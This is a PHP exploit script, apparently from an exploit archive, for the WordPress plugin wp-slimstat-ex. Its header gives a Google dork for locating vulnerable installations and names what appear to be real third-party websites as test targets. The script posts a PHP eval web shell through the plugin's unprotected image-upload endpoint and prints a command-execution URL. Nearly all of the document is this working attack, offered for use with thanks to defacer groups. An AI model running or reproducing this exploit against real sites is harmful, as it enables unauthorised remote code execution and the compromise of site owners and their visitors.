# Google Dork: inurl:/wp-content/plugins/wp-slimstat-ex// inurl:wp-content/plugins/wp-slimstat-ex/
# Date: [03-10-2013]
# Exploit Author: wantexz
# Tested on: [wantexz]
# CVE : [just fun]
# bug tes: http://crystalclearfinances.com/wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php
# => http://crystalclearfinances.com/wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php
# => http://yonyon-blog.net/wp-content/plugins/wp-slimstat-ex/lib/ofc//php-ofc-library/ofc_upload_image.php
<?php

# WP plugins  wp-slimstat-ex ~ Exploit 
# http://indonesiancoder.com/


echo <<<EOT

-----------------------------------
/   WP plugins  wp-slimstat-ex ~ Exploit   \
\           Author: wantexz           /
-----------------------------------

################################################################################################
#  author: wantexz
#
#   thank to : tukulesto,arianom,cimpli,jack_jahat,k4L0NG666,Br3NG0S,Xr0b0t,blie,KaMtiEz,Mboys
#            all indonesian coder, indonesian defacer, kill-9 ,jatimcom , malangcyber
#
################################################################################################

EOT;


$options = getopt(&#039;u:f:&#039;);

if(!isset($options[&#039;u&#039;], $options[&#039;f&#039;]))
die("\n        Usage example: php IDC.php -u http://target.com/ -f shell.php\n
-u http://target.com/    The full path to Joomla!
-f shell.php             The name of the file to create.\n");

$url     =  $options[&#039;u&#039;];
$file    =  $options[&#039;f&#039;];


$shell = "{$url}/wp-content/plugins/wp-slimstat-ex/lib/ofc//tmp-upload-images/{$file}";
$url   = "{$url}/wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php?name={$file}";

$data      = "<?php eval(\$_GET[&#039;cmd&#039;]); ?>";
$headers = array(&#039;User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1&#039;,
&#039;Content-Type: text/plain&#039;);


echo "        [+] Submitting request to: {$options[&#039;u&#039;]}\n";


$handle = curl_init();

curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

$source = curl_exec($handle);
curl_close($handle);


if(!strpos($source, &#039;Undefined variable: HTTP_RAW_POST_DATA&#039;) && @fopen($shell, &#039;r&#039;))
{
echo "        [+] Exploit completed successfully!\n";
echo "        ______________________________________________\n\n        {$shell}?cmd=system(&#039;id&#039;);\n";
}
else
{
die("        [+] Exploit was unsuccessful.\n");
}

?>

